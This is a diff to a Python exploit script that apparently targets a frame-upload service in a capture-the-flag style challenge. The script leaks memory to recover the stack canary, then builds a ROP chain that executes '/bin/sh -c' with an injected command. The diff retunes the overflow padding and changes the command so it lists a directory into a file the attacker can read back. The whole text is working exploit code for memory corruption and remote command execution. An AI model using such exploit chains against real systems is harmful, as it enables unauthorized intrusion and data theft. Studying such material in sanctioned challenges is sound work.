@@ -23,7 +23,7 @@ payload_leak = p64(64) + b"A" * 8 + b"\x00"
 token = mch.upload_frames(sess, 'kek', [payload_leak])
 
 resp = mch.get_frames(sess, token, 0, 0)[0]
-resp = resp[8:]
+resp = decode(resp[8:])
 canary = resp[24:32]
 
 leak = u64(resp[-8:])
@@ -59,8 +59,7 @@ cmd = pad(b'/bin/sh\x00')
 argv = [
     pad(b'/bin/sh\x00'),
     pad(b'-c\x00'),
-    # pad(f'ls /anime > /anime/{token}/1.frame\x00'.encode()),
-    pad(f'echo "kek" > /tmp/proof\x00'.encode()),
+    pad(f'ls /anime > /anime/{token}/0.frame\x00'.encode()),
 ]
 
 rop = b""
@@ -91,6 +90,9 @@ rop += pop_rsi + p64(argv_addr)
 rop += pop_rdx + p64(0)
 rop += syscall
 
-payload_rce = p64(56 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 24 + rop
+payload_rce = p64(72 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 40 + rop
 
 mch.parse_frames(sess, [payload_rce])
+
+print('All uploaded tokens:')
+print(mch.get_frames(sess, token, 0, 0)[0].decode())
